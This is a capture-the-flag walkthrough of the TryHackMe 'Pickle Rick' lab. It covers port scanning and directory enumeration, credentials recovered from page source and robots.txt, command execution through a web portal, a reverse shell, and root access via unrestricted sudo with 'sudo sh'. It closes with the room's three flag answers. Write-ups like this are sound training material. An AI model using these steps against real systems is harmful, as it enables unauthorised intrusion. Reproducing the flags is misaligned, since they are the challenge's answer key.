# Pickle Rick – TryHackMe Writeup

## Overview

This report documents the compromise of the **Pickle Rick** TryHackMe machine through web application enumeration, credential discovery, authenticated command execution, reverse shell access, and privilege escalation via a dangerous sudo misconfiguration.

The objective was to identify hidden resources, gain access to the web portal, obtain a shell on the target system, escalate privileges, and retrieve all three secret ingredients.

---

# Target Information

| Field | Value |
|---------|---------|
| Target IP | 10.48.169.205 |
| Platform | TryHackMe |
| Room Name | Pickle Rick |

---

# Executive Summary

During the assessment, several weaknesses were identified that allowed progression from unauthenticated web access to full root compromise.

The attack chain involved:

1. Enumerating the web application.
2. Discovering credentials exposed in web resources.
3. Authenticating to the application portal.
4. Abusing command execution functionality.
5. Obtaining a reverse shell.
6. Retrieving the first and second ingredients.
7. Enumerating sudo privileges.
8. Exploiting unrestricted sudo access.
9. Escalating privileges to root.
10. Retrieving the final ingredient.

---

# Methodology

The assessment followed a standard penetration testing methodology:

* Reconnaissance
* Enumeration
* Credential Discovery
* Initial Access
* Command Execution
* Privilege Escalation
* Flag Discovery

---

# Phase 1 – Reconnaissance

## Host Discovery

### Command

```bash
ping 10.48.169.205
```

### Findings

The target responded to ICMP requests, confirming network connectivity.

### Observation

```text
TTL = 62
```

The TTL value suggested that the target was likely running a Linux-based operating system.

---

# Phase 2 – Network Enumeration

## Port Scan

### Command

```bash
nmap 10.48.169.205
```

### Results

| Port | State | Service |
|------|--------|---------|
| 22 | Open | SSH |
| 80 | Open | HTTP |

### Analysis

The target exposed a web application on port 80 and an SSH service on port 22.

Since no SSH credentials were known, the web application became the primary attack surface.

---

# Phase 3 – Web Enumeration

## Directory Discovery

### Command

```bash
gobuster dir \
-u http://10.48.169.205 \
-w /usr/share/wordlists/dirbuster/directory-list-1.0.txt \
-x php,txt,js,html,py
```

### Results

```text
/index.html
/assets
/portal.php
/clue.txt
/robots.txt
/login.php
```

### Analysis

Several interesting resources were identified, including:

* login.php
* portal.php
* robots.txt

These became the focus of further investigation.

---

# Phase 4 – Credential Discovery

## Reviewing Page Source

### Location

```text
http://10.48.169.205
```

### Finding

The page source contained an HTML comment:

```html
<!--
Note to self, remember username!

Username: R1ckRul3s
-->
```

### Analysis

A valid username was disclosed within the source code.

### Recovered Username

```text
R1ckRul3s
```

---

## Reviewing robots.txt

### URL

```text
http://10.48.169.205/robots.txt
```

### Result

```text
Wubbalubbadubdub
```

### Analysis

The value appeared to be a password and was likely intended for authentication.

### Recovered Password

```text
Wubbalubbadubdub
```

---

# Phase 5 – Initial Access

## Login Portal Authentication

### URL

```text
http://10.48.169.205/login.php
```

### Credentials

```text
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

### Result

Successful authentication redirected to:

```text
portal.php
```

### Analysis

The portal provided authenticated access to administrative functionality.

---

# Phase 6 – Command Execution

## Discovering Command Execution

Inside the authenticated portal, a command input box was available.

### Observation

Commands entered into the form were executed on the underlying operating system.

### Security Impact

The functionality allowed arbitrary operating system command execution.

This effectively provided remote code execution.

---

# Phase 7 – Reverse Shell Access

## Reverse Shell Execution

A Bash reverse shell payload was executed through the command execution portal.

### Listener

```bash
nc -lvnp 1234
```

### Result

```text
connect to [192.168.130.28] from [10.48.169.205]
```

### Verification

```bash
whoami
```

### Output

```text
www-data
```

### Analysis

A reverse shell was obtained as the web server user.

Reverse shells provide a more interactive environment than a web command execution panel and are preferred for post-exploitation activities.

---

# Phase 8 – First Ingredient Discovery

## Enumerating Web Root

### Command

```bash
ls
```

### Result

```text
Sup3rS3cretPickl3Ingred.txt
```

---

## Reading the File

### Command

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

### Result

```text
mr. meeseek hair
```

### Ingredient

```text
mr. meeseek hair (1st ingredient)
```

---

# Phase 9 – Second Ingredient Discovery

## Navigating to Rick's Home Directory

### Commands

```bash
cd /home
ls

cd rick
ls
```

### Result

```text
second ingredients
```

---

## Reading the File

### Command

```bash
cat "second ingredients"
```

### Result

```text
1 jerry tear
```

### Ingredient

```text
1 jerry tear (2nd ingredient)
```

---

# Phase 10 – Privilege Escalation Enumeration

## Checking Current User

### Command

```bash
whoami
```

### Result

```text
www-data
```

---

## Attempting Root Access

### Command

```bash
cd /root
```

### Result

```text
Permission denied
```

---

## Enumerating Sudo Privileges

### Command

```bash
sudo -l
```

### Result

```text
(ALL) NOPASSWD: ALL
```

### Analysis

The web server account was allowed to execute any command as root without providing a password.

### Security Impact

This represents a critical privilege escalation vulnerability.

---

# Phase 11 – Privilege Escalation

## Obtaining Root Shell

### Command

```bash
sudo sh
```

### Verification

```bash
whoami
```

### Output

```text
root
```

### Analysis

The unrestricted sudo configuration provided immediate root access.

---

# Phase 12 – Third Ingredient Discovery

## Accessing Root Directory

### Commands

```bash
cd /root
ls
```

### Result

```text
3rd.txt
```

---

## Reading the File

### Command

```bash
cat 3rd.txt
```

### Result

```text
3rd ingredients: fleeb juice
```

### Ingredient

```text
fleeb juice (3rd ingredient)
```

---

# Attack Chain

```text
Web Enumeration
       ↓
Page Source Review
       ↓
Username Discovered
(R1ckRul3s)
       ↓
robots.txt Review
       ↓
Password Discovered
(Wubbalubbadubdub)
       ↓
Portal Authentication
       ↓
Command Execution
       ↓
Reverse Shell as www-data
       ↓
First Ingredient
       ↓
Second Ingredient
       ↓
sudo -l
       ↓
NOPASSWD: ALL
       ↓
sudo sh
       ↓
Root Shell
       ↓
Third Ingredient
```

---

# Findings & Vulnerabilities

| ID | Finding | Severity |
|----|----------|----------|
| F-01 | Credentials Exposed in Source Code | Medium |
| F-02 | Sensitive Information Exposed via robots.txt | Medium |
| F-03 | Arbitrary Command Execution Functionality | Critical |
| F-04 | Reverse Shell Access Achievable | Critical |
| F-05 | Unrestricted Sudo Permissions (NOPASSWD: ALL) | Critical |

---

# Tools Used

### Enumeration

* Nmap
* Gobuster

### Web Application Testing

* Browser Developer Tools

### Initial Access

* Portal Command Execution

### Shell Access

* Netcat
* Bash Reverse Shell

### Privilege Escalation

* Sudo

---

# Ingredients Obtained

| Ingredient | Value |
|------------|--------|
| Ingredient 1 | mr. meeseek hair |
| Ingredient 2 | 1 jerry tear |
| Ingredient 3 | fleeb juice |

---

# Conclusion

The compromise of the Pickle Rick machine was achieved through a chain of web application weaknesses and privilege escalation misconfigurations.

Credential information was exposed through both HTML source code comments and the robots.txt file, allowing authentication to the administrative portal. The portal provided direct operating system command execution, which was leveraged to obtain a reverse shell as the web server user. Further enumeration revealed unrestricted sudo permissions, enabling immediate escalation to root and retrieval of the final ingredient.

This assessment demonstrates the dangers of exposing sensitive information within web resources, implementing insecure command execution functionality, and granting excessive sudo privileges.